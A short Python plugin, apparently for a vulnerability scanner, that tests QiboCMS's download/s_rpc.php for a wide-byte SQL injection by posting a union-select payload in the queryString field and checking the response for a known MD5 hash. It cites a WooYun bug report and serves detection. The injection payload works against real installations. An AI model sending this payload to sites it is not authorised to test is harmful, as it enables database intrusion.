#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:这个程序员不太冷
#refer:http://www.wooyun.org/bugs/wooyun-2014-055842
import re
def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    payload="download/s_rpc.php"
    data="queryString=aa%df'%20union%20select%20md5(1234)%23"
    url=arg+payload
    code, head, res, errcode, _ = curl.curl2(url,data)
    if code==200 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms','http://127.0.0.1:8080/qibocms_down/')[1])